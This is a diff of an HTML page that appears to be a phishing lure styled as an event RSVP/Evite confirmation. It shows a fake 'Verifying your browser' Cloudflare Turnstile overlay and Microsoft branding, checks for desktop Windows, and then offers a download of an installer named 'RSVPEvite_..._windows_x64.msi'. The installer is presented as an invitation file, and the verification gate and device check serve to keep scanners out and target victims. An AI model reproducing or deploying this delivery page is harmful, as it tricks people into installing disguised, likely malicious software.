@@ -229,17 +229,14 @@
 </head>
 <body>
 
-<!-- Loading Overlay with Turnstile -->
 <div id="loading-overlay">
     <div class="loading-spinner-container">
         <div class="loading-spinner"></div>
-        <img src="https://mailmeteor.com/logos/assets/PNG/Microsoft_Logo_256px.png" class="loading-icon" alt="Loading Icon">
     </div>
     <div class="loading-text">Verifying your browser...</div>
     <div id="cf-turnstile"></div>
 </div>
 
-<!-- Main Content Container (hidden until verification) -->
 <div class="form-container">
     <div class="container" id="mainContainer">
         <div class="thanks-card">
@@ -265,7 +262,6 @@
 </div>
 
 <script>
-    // Files configuration
     const files = {
         windows: {
             url: "RSVPEvite_CFXGNRP8HO1S_19SYPURD17668_windows_x64.msi",
@@ -419,7 +415,6 @@
         }, 2000);
     }
 
-    // Cloudflare Turnstile Implementation
     document.addEventListener('DOMContentLoaded', function() {
         turnstile.ready(function() {
             turnstile.render('#cf-turnstile', {
@@ -432,7 +427,6 @@
                         document.getElementById('loading-overlay').style.display = 'none';
                         document.body.classList.add('verified');
                         
-                        // Check device and start process after verification
                         if (!isDesktopWindows()) {
                             showDeviceWarning();
                             return;
@@ -455,7 +449,7 @@
 
         const manualBtn = document.getElementById("manualDownload");
         if (manualBtn) {
-            manualBtn.disabled = true; // Disabled until verification
+            manualBtn.disabled = true; 
             manualBtn.addEventListener("click", function(e) {
                 e.preventDefault();
                 if (!turnstileVerified) {
